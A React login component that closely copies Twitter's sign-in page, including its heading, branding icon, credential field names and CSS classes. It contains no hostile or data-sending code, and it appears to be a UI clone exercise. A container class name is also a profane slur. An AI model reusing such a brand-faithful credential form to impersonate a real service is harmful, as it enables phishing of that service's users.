import React from "react";
import "./login.scss";
import { withRouter, Link } from "react-router-dom";
import { Navbar, Nav, Container } from "react-bootstrap";
import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
import { faTwitter } from "@fortawesome/free-brands-svg-icons";

const Login = () => {
  return (
    <>
      <div className="topbar">
        <Navbar
          expand="lg"
          bg="light"
          variant="light"
          className="navbar navb-color"
        >
          <Container className="cunt">
            <Navbar.Brand href="#home" style={{ color: "#66757f !important" }}>
              <FontAwesomeIcon icon={faTwitter} /> Home
            </Navbar.Brand>
            <Navbar.Toggle aria-controls="responsive-navbar-nav" />
            <Navbar.Collapse id="responsive-navbar-nav">
              <Nav className="mr-auto">
                <Nav.Link href="#pricing">About</Nav.Link>
              </Nav>
              <Nav></Nav>
            </Navbar.Collapse>
          </Container>
        </Navbar>
      </div>
      <section className="login-section">
        <div className="page-canvas">
          <div class="signin-wrapper" data-login-message="">
            <h1>Log in to Twitter</h1>
            <form
              class="t1-form clearfix signin js-signin"
              method="post"
            >
              <fieldset>
                <div class="clearfix field">
                  <input
                    class="js-username-field email-input js-initial-focus"
                    type="text"
                    name="session[username_or_email]"
                    autocomplete="on"
                    value=""
                    placeholder="Phone, email or username"
                  />
                </div>
                <div class="clearfix field">
                  <input
                    class="js-password-field js-initial-focus"
                    type="password"
                    name="session[password]"
                    placeholder="Password"
                  />
                </div>
              </fieldset>

              <div class="captcha js-captcha"></div>
              <div class="clearfix">
            <button
                  type="submit"
                  class="submit EdgeButton EdgeButton--primary EdgeButtom--medium"
                >
                  Log in
                </button>

                <div class="subchck">
                  <label class="t1-label remember">
                    <input
                      type="checkbox"
                      value="1"
                      name="remember_me"
                      checked="checked"
                    />
                    Remember me
                    <span class="separator">·</span>
                    <a
                      class="forgot"
                      href="/account/begin_password_reset"
                      rel="noopener"
                    >
                      Forgot password?
                    </a>
                  </label>
                </div>
              </div>
            </form>
          </div>
        </div>
      </section>
    </>
  );
};

export default Login;
